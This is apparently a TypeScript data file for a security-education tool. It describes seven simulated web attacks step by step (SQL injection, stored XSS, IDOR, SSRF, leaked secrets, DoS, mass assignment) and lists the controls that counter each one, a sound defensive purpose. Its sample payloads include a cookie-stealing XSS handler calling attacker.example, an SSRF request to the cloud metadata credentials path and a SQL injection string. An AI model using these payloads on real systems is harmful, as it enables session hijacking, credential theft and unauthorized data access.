import type { ScenarioDef, ScenarioId } from "./types";

const SR = "https://github.com/Hemanth2709/SentinelRules/blob/main/docs/features";

/**
 * Simulated attack scenarios. Every payload is a synthetic, illustrative
 * string; nothing here sends a request anywhere.
 */
export const SCENARIOS: Partial<Record<ScenarioId, ScenarioDef>> = {
  "sql-injection": {
    id: "sql-injection",
    title: "SQL injection",
    summary: "A search term is concatenated into a SQL query, so the attacker's input becomes part of the query itself.",
    cwe: ["CWE-89"],
    owasp: ["A03:2021 Injection"],
    entry: "client",
    target: "db",
    preconditions: [
      "The API builds a query by concatenating or interpolating request data",
      "The API can reach the database",
    ],
    impact: "Reading or changing data the user should never see: other users' records, password hashes, or whole tables, depending on the database role.",
    steps: [
      { kind: "client", text: "The attacker puts SQL syntax in a search field instead of a product name.", sample: "GET /api/products?q=' OR '1'='1" },
      { kind: "cdn", text: "The request is not cacheable, so the CDN forwards it to the origin." },
      { kind: "waf", text: "The request passes through the WAF." },
      { kind: "gateway", text: "The gateway routes the request; the token is valid, so it is allowed." },
      { kind: "web", text: "The web app forwards the search term to the API unchanged." },
      {
        kind: "api",
        text: "The API builds the query by concatenation. The quote in the input closes the string, and OR '1'='1' matches every row.",
        sample: "SELECT * FROM products WHERE name LIKE '%' OR '1'='1%'",
      },
      { kind: "db", text: "The database runs the altered query with the application's privileges." },
    ],
    controls: [
      { control: "parameterized-queries", effect: "blocks", note: "The search term is sent as a value, so it is matched as text and the query's structure cannot change." },
      { control: "sast", effect: "blocks", note: "sentinel-sql-injection-raw-query flags the concatenated query in CI, so it is fixed before deployment. This only holds if the finding is acted on." },
      { control: "waf-rules", effect: "reduces", note: "This payload matches a common signature and is blocked. Encoded or restructured payloads can still get through." },
      { control: "least-privilege-db", effect: "reduces", note: "The injection still runs, but the role can only read the products table, so other tables stay out of reach." },
      { control: "runtime-monitoring", effect: "detects", note: "A spike in SQL errors and unusually large result sets raises an alert. The first requests still succeed." },
    ],
    related: { label: "Sentinel rule: SQL injection", href: `${SR}/01-sql-injection/README.md` },
  },

  xss: {
    id: "xss",
    title: "Stored cross-site scripting",
    summary: "A product review containing HTML is stored, then rendered as raw HTML for every visitor, so the attacker's script runs in their browsers.",
    cwe: ["CWE-79"],
    owasp: ["A03:2021 Injection"],
    entry: "client",
    target: "web",
    preconditions: ["The web app renders stored, user-supplied text as HTML (for example with dangerouslySetInnerHTML)", "No Content-Security-Policy blocks inline script"],
    impact: "Script running as the victim on your origin: reading what they see, acting with their session, or showing a fake login form.",
    steps: [
      { kind: "client", text: "The attacker submits a review whose text is an HTML element with a script handler.", sample: "<img src=x onerror=\"fetch('https://attacker.example/c?'+document.cookie)\">" },
      { kind: "cdn", text: "The page is cached at the edge with the review in it." },
      { kind: "waf", text: "The request passes through the WAF." },
      { kind: "web", text: "Later, the product page renders the stored review as raw HTML. Every visitor's browser runs the handler.", sample: "<div dangerouslySetInnerHTML={{ __html: review.body }} />" },
    ],
    controls: [
      { control: "output-encoding-csp", effect: "blocks", note: "Rendering the review as text, not HTML, removes the injection; a strict CSP also stops inline handlers from running." },
      { control: "sast", effect: "blocks", at: "web", note: "sentinel-react-dangerously-set-inner-html flags unsanitized dangerouslySetInnerHTML in CI, so it is fixed before deployment, if the finding is acted on." },
      { control: "waf-rules", effect: "reduces", note: "Obvious <script> payloads are blocked; event-handler and encoded variants often are not." },
      { control: "runtime-monitoring", effect: "detects", note: "Only if the web app is monitored and CSP violation reports are collected. Connect monitoring to the web app to see this." },
    ],
    related: { label: "Sentinel rule: unsafe HTML", href: `${SR}/05-unsafe-html/README.md` },
  },

  idor: {
    id: "idor",
    title: "Broken object-level authorization (IDOR)",
    summary: "A signed-in user changes the order id in a request and gets someone else's order, because the API checks who they are but not what they own.",
    cwe: ["CWE-639", "CWE-862"],
    owasp: ["A01:2021 Broken Access Control"],
    entry: "client",
    target: "db",
    preconditions: ["The API authenticates the caller", "It loads the record by id without checking that the caller owns it", "Ids are guessable or enumerable"],
    impact: "Reading or changing other customers' orders, invoices or profiles, one id at a time.",
    steps: [
      { kind: "client", text: "A signed-in attacker replaces their own order id with a neighbouring one.", sample: "GET /api/orders/10452  →  GET /api/orders/10453" },
      { kind: "waf", text: "The request looks completely normal, so the WAF has nothing to match." },
      { kind: "gateway", text: "The token is valid, so the gateway lets it through." },
      { kind: "web", text: "The web app forwards the request." },
      { kind: "api", text: "The API finds order 10453 and returns it. It never compares the order's owner with the caller.", sample: "orders.findOne({ where: { id } })" },
      { kind: "db", text: "The database returns another customer's order." },
    ],
    controls: [
      { control: "object-authorization", effect: "blocks", note: "Querying by id and owner (where: { id, ownerId: user.id }) returns nothing for someone else's order." },
      { control: "sast", effect: "reduces", note: "Sentinel's route-guard heuristics flag handlers with no visible guard or auth check. They cannot prove an ownership check is right, so this only finds the obvious cases." },
      { control: "rate-limiting", effect: "reduces", note: "Slows enumeration of many ids. Add an API gateway to the path to see this act; one guessed id still works." },
      { control: "runtime-monitoring", effect: "detects", note: "One account reading hundreds of different orders is a clear signal, if someone is alerted." },
    ],
    related: { label: "Sentinel rules: missing authorization", href: `${SR}/08-missing-authorization/README.md` },
  },

  ssrf: {
    id: "ssrf",
    title: "Server-side request forgery (SSRF)",
    summary: "An image-preview feature fetches any URL it is given, so the attacker points it at an internal address the server can reach and they cannot.",
    cwe: ["CWE-918"],
    owasp: ["A10:2021 Server-Side Request Forgery"],
    entry: "client",
    target: "secrets",
    preconditions: ["The API fetches a URL taken from the request", "Internal services or the cloud metadata endpoint are reachable from the API's network"],
    impact: "Reading internal services, or temporary cloud credentials from the instance metadata endpoint, which can then be used from anywhere.",
    steps: [
      { kind: "client", text: "The attacker asks the preview endpoint to fetch an internal address instead of an image.", sample: "GET /api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
      { kind: "waf", text: "The request passes through the WAF." },
      { kind: "web", text: "The web app forwards the URL to the API." },
      { kind: "api", text: "The API calls fetch(url) with the attacker's value, from inside the network.", sample: "const res = await fetch(req.query.url)" },
      { kind: "secrets", text: "The internal endpoint answers. In this model it stands for the credentials and internal services the API's network can reach." },
    ],
    controls: [
      { control: "egress-allowlist", effect: "blocks", note: "The URL's host is checked against an allowlist in code, and the network only permits listed destinations, so internal addresses are refused." },
      { control: "sast", effect: "reduces", note: "sentinel-ssrf-user-controlled-url flags request data reaching fetch, axios or HttpService in the same file. A URL passed through another file is missed." },
      { control: "waf-rules", effect: "reduces", note: "Some rule sets block literal metadata IPs in parameters; decimal, IPv6 or DNS-rebinding forms get through." },
      { control: "iam-least-privilege", effect: "reduces", at: "secrets", note: "If the stolen credentials can do very little, the damage is limited." },
    ],
    related: { label: "Sentinel rule: SSRF", href: `${SR}/09-ssrf/README.md` },
  },

  "credential-exposure": {
    id: "credential-exposure",
    title: "Credential exposure in the browser bundle",
    summary: "A payment secret key is put in a NEXT_PUBLIC_ variable, so Next.js inlines it into JavaScript that every visitor downloads.",
    cwe: ["CWE-200", "CWE-798"],
    owasp: ["A01:2021 Broken Access Control", "A05:2021 Security Misconfiguration"],
    entry: "client",
    target: "web",
    preconditions: ["A secret is read through a NEXT_PUBLIC_ variable", "The code runs in, or is imported by, a client component"],
    impact: "Anyone can call the payment provider as you: refunds, customer data, charges, until the key is rotated.",
    steps: [
      { kind: "client", text: "Anyone opens the site and looks at the JavaScript it downloads; no exploit is needed." },
      { kind: "cdn", text: "The bundle is cached and served from the edge, to everyone." },
      { kind: "waf", text: "A normal page load; nothing for the WAF to block." },
      { kind: "web", text: "The client bundle contains the literal key, inlined at build time.", sample: "process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY  →  \"sk_live_EXAMPLE_NOT_A_REAL_KEY\"" },
    ],
    controls: [
      { control: "secrets-manager", effect: "blocks", at: "web", note: "The secret is only read on the server at runtime (no NEXT_PUBLIC_ prefix), so it never enters the bundle." },
      { control: "sast", effect: "blocks", at: "web", note: "sentinel-next-public-secret-env flags NEXT_PUBLIC_ names that look like secrets in CI, before the build ships." },
      { control: "runtime-monitoring", effect: "detects", note: "Only if usage of the key is monitored; connect monitoring to the web app to see it. The key is still public." },
    ],
    related: { label: "Sentinel rule: public secrets", href: `${SR}/04-next-public-secrets/README.md` },
  },

  ddos: {
    id: "ddos",
    title: "Denial of service (concept)",
    summary: "A flood of requests to an expensive endpoint exhausts the API, so real users get timeouts. Shown conceptually; nothing is sent.",
    cwe: ["CWE-400", "CWE-770"],
    owasp: ["A04:2021 Insecure Design"],
    entry: "client",
    target: "api",
    preconditions: ["An endpoint does expensive work per request", "No limits on how often a client can call it"],
    impact: "The service is slow or down for everyone, and the bill grows with the attack.",
    steps: [
      { kind: "client", text: "Thousands of clients request an expensive search at once.", sample: "GET /api/search?q=a  ×  50,000 per minute (simulated)" },
      { kind: "cdn", text: "Search results are not cacheable, so the CDN passes every request to the origin." },
      { kind: "waf", text: "Each request on its own looks legitimate." },
      { kind: "gateway", text: "Requests are routed to the API." },
      { kind: "web", text: "The web app forwards each search." },
      { kind: "api", text: "Every request runs a full-text query. Connection pools fill and response times climb until requests fail." },
    ],
    controls: [
      { control: "cdn-shield", effect: "reduces", note: "Absorbs volumetric and protocol floods at the edge. Add a CDN in front of the WAF to see this act." },
      { control: "rate-limiting", effect: "reduces", note: "Caps each client, which stops a single source and slows scripted abuse. Add an API gateway to the path to see this act." },
      { control: "waf-rules", effect: "reduces", note: "Bot and reputation rules drop known bad sources; a large botnet still gets through." },
      { control: "runtime-monitoring", effect: "detects", note: "Latency and error alerts fire quickly, which starts the response but does not stop the traffic." },
    ],
  },

  "privilege-escalation": {
    id: "privilege-escalation",
    title: "Privilege escalation via mass assignment",
    summary: "A profile update writes every field in the request body, so a user adds role: \"admin\" and becomes an administrator.",
    cwe: ["CWE-915", "CWE-269"],
    owasp: ["A01:2021 Broken Access Control", "A08:2021 Software and Data Integrity Failures"],
    entry: "client",
    target: "db",
    preconditions: ["The API writes the whole request body to the user record", "The record has a role or permission field"],
    impact: "A normal account gains administrator rights, and with them everything the admin can reach.",
    steps: [
      { kind: "client", text: "A signed-in user edits their profile and adds one extra field to the request.", sample: "PATCH /api/profile  { \"name\": \"Ana\", \"role\": \"admin\" }" },
      { kind: "waf", text: "A small JSON body with ordinary words: nothing to block." },
      { kind: "web", text: "The web app forwards the body." },
      { kind: "api", text: "The API passes the parsed body straight to the update.", sample: "prisma.user.update({ where: { id }, data: body })" },
      { kind: "db", text: "The user's role column is now admin." },
    ],
    controls: [
      { control: "input-allowlist", effect: "blocks", note: "Only declared, user-editable fields survive validation, so role is stripped before the update." },
      { control: "sast", effect: "blocks", note: "sentinel-mass-assignment-unfiltered-body flags a request body written whole to the database, and Rule 03 flags ValidationPipe without whitelist." },
      { control: "runtime-monitoring", effect: "detects", note: "An alert on role changes made outside the admin tool catches it after the fact." },
      { control: "least-privilege-db", effect: "reduces", note: "Little help here: the application role legitimately updates users. Shown so the limit of this control is clear." },
    ],
    related: { label: "Sentinel rule: mass assignment", href: `${SR}/11-mass-assignment/README.md` },
  },
};
